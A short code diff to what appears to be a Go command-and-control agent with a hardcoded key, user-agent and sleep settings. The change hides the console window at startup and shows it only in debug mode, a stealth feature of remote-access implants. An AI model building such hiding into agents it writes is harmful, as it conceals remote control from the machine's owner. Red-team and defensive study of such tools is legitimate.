@@ -10,6 +10,9 @@ import (
 
 var key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
 
+func init() {
+	util.HideConsole()
+}
 
 func main() {
 	agent := util.BuildAgentConfig()
@@ -29,8 +32,8 @@ func main() {
 		"Useragent": *useragent,
 		"Sleep": *sleep,
 	})
-	if !*util.DebugMode {
-		util.HideConsole()
+	if *util.DebugMode {
+		util.ShowConsole()
 	}
 	if !strings.Contains(agent.Address, ":") {
 		util.DebugLogf("Your address is incorrect\n")
